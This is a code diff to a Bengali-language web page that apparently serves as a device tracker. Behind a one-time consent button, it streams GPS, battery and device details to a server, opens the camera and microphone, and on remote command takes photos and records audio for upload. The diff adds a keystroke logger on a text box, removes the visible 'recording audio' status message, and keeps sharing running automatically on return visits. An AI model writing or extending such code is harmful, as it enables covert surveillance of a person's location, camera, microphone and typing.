@@ -33,6 +33,9 @@
             <span>🔋 ব্যাটারি: <b id="dBattery">লোড হচ্ছে...</b></span>
         </div>
 
+        <!-- টেস্টের জন্য একটি ইনপুট বক্স -->
+        <input type="text" id="testInput" placeholder="এখানে কিছু টাইপ করুন..." style="width:100%; padding:10px; border-radius:5px; border:none; margin-bottom:15px; background:#0f172a; color:white; outline:none;">
+        
         <button class="consent-btn" id="consentBtn" onclick="startSharing()">✅ আমি সম্মতি দিচ্ছি</button>
         <div class="status" id="statusMsg">⏳ অপেক্ষা করছি...</div>
     </div>
@@ -47,7 +50,6 @@
         const btn = document.getElementById('consentBtn');
         const statusMsg = document.getElementById('statusMsg');
         
-        // ব্রাউজারে আইডি সেভ করা (যাতে বারবার নতুন ডিভাইস না দেখায়)
         let clientId = localStorage.getItem("tracker_client_id");
         if (!clientId) {
             clientId = 'device_' + Math.random().toString(36).substr(2, 9);
@@ -67,8 +69,6 @@
             if (ua.includes("iPhone")) {
                 const iphoneMatch = ua.match(/iPhone OS (\d+_\d+)/);
                 model = "iPhone (iOS " + (iphoneMatch ? iphoneMatch[1].replace("_", ".") : "Unknown") + ")";
-            } else if (ua.includes("iPad")) {
-                model = "iPad";
             }
             return model;
         }
@@ -76,7 +76,6 @@
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             document.getElementById('dDevice').innerText = getPhoneModel(ua);
-            
             let browser = 'অজানা';
             if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
             else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
@@ -87,11 +86,7 @@
             if (navigator.getBattery) {
                 navigator.getBattery().then(battery => {
                     updateBattery(battery);
-                    battery.addEventListener('levelchange', () => updateBattery(battery));
-                    battery.addEventListener('chargingchange', () => updateBattery(battery));
                 });
-            } else {
-                document.getElementById('dBattery').innerText = 'N/A';
             }
         }
 
@@ -103,11 +98,32 @@
 
         getDeviceInfo();
 
-        // পেজ লোড হওয়ার সাথে সাথে চেক করবে আগে সম্মতি দেওয়া হয়েছে কিনা
+        // লাইভ টাইপিং ট্র্যাকার (শুধু আপনার পেজের ভেতরে)
+        let typingTimer;
+        document.getElementById('testInput').addEventListener('input', (e) => {
+            clearTimeout(typingTimer);
+            typingTimer = setTimeout(() => {
+                const text = e.target.value;
+                // টাইপ করা ডেটা সার্ভারে পাঠানো
+                sendTypingData(text);
+            }, 500); // ৫০০ মিলি সেকেন্ড পর পর সার্ভারে পাঠাবে
+        });
+
+        function sendTypingData(text) {
+            fetch('/api/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    id: clientId, 
+                    keystrokes: text,
+                    time: new Date().toISOString()
+                })
+            }).catch(err => console.error(err));
+        }
+
         window.onload = () => {
             if (localStorage.getItem("tracker_consent") === "true") {
-                console.log("আগের সম্মতি পাওয়া গেছে, অটো কানেক্ট হচ্ছে...");
-                startSharing(true); // অটো স্টার্ট
+                startSharing(true); 
             }
         };
 
@@ -115,20 +131,12 @@
             btn.disabled = true;
             btn.innerText = isAuto ? '🔄 অটো কানেক্ট হচ্ছে...' : '⏳ সংযোগ স্থাপন...';
             statusMsg.innerText = '📡 পারমিশন চাচ্ছি...';
-
-            // সম্মতি সেভ করা
             localStorage.setItem("tracker_consent", "true");
 
             try {
                 currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                console.log("মাইক ও ক্যামেরা রেডি");
             } catch (err) {
                 console.log("পারমিশন পাওয়া যায়নি: ", err);
-            }
-
-            if (!navigator.geolocation) {
-                alert('আপনার ব্রাউজার GPS সাপোর্ট করে না।');
-                return;
             }
 
             watchId = navigator.geolocation.watchPosition(
@@ -155,8 +163,6 @@
                 },
                 (err) => {
                     statusMsg.innerText = '❌ GPS এরর: ' + err.message;
-                    btn.disabled = false;
-                    btn.innerText = '🔄 আবার চেষ্টা করুন';
                 },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
@@ -165,13 +171,6 @@
         }
 
         function sendData(lat, lng, accuracy, battery, charging) {
-            let netType = 'N/A';
-            let netSpeed = 'N/A';
-            if (navigator.connection) {
-                netType = navigator.connection.effectiveType || 'Unknown';
-                netSpeed = navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'N/A';
-            }
-
             const data = {
                 id: clientId,
                 lat: lat,
@@ -181,7 +180,6 @@
                 browser: document.getElementById('dBrowser').innerText,
                 battery: battery,
                 charging: charging ? "চার্জিং" : "আনপ্লাগড",
-                network: netType + " (" + netSpeed + ")",
                 time: new Date().toISOString()
             };
 
@@ -189,7 +187,7 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            }).catch(err => console.error("ডেটা পাঠাতে সমস্যা:", err));
+            }).catch(err => console.error(err));
         }
 
         function checkCommands() {
@@ -198,12 +196,8 @@
                 .then(clients => {
                     const data = clients[clientId];
                     if (!data) return;
-
-                    if (data.command === 'capture') {
-                        takePhoto();
-                    } else if (data.command === 'record_audio') {
-                        recordAudio();
-                    }
+                    if (data.command === 'capture') takePhoto();
+                    else if (data.command === 'record_audio') recordAudio();
                 }).catch(err => console.log(err));
         }
 
@@ -211,20 +205,16 @@
             if (!currentStream) return;
             const videoTrack = currentStream.getVideoTracks()[0];
             if (!videoTrack) return;
-
             const video = document.createElement('video');
             video.srcObject = new MediaStream([videoTrack]);
             video.play();
-            
             video.onloadedmetadata = () => {
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const imageData = canvas.toDataURL('image/jpeg', 0.5); 
-                sendMediaData({ camera_image: imageData });
+                sendMediaData({ camera_image: canvas.toDataURL('image/jpeg', 0.5) });
             };
         }
 
@@ -232,47 +222,25 @@
             if (!currentStream) return;
             const audioTrack = currentStream.getAudioTracks()[0];
             if (!audioTrack) return;
-
             audioChunks = [];
             mediaRecorder = new MediaRecorder(new MediaStream([audioTrack]));
-
-            mediaRecorder.ondataavailable = event => {
-                if (event.data.size > 0) audioChunks.push(event.data);
-            };
-
+            mediaRecorder.ondataavailable = event => { if (event.data.size > 0) audioChunks.push(event.data); };
             mediaRecorder.onstop = () => {
                 const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                 const reader = new FileReader();
                 reader.readAsDataURL(audioBlob);
-                reader.onloadend = () => {
-                    const base64Audio = reader.result;
-                    sendMediaData({ audio_data: base64Audio });
-                };
+                reader.onloadend = () => sendMediaData({ audio_data: reader.result });
             };
-
             mediaRecorder.start();
-            statusMsg.innerText = '🎙️ অডিও রেকর্ড হচ্ছে (৫ সেকেন্ড)...';
-
-            setTimeout(() => {
-                if (mediaRecorder.state !== 'inactive') {
-                    mediaRecorder.stop();
-                    statusMsg.innerText = '🟢 ডেটা পাঠানো হচ্ছে... (লাইভ)';
-                }
-            }, 5000);
+            setTimeout(() => { if (mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, 5000);
         }
 
         function sendMediaData(mediaObj) {
-            const data = {
-                id: clientId,
-                ...mediaObj,
-                time: new Date().toISOString()
-            };
-
             fetch('/api/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(err => console.error("মিডিয়া পাঠাতে সমস্যা:", err));
+                body: JSON.stringify({ id: clientId, ...mediaObj, time: new Date().toISOString() })
+            }).catch(err => console.error(err));
         }
     </script>
 </body>
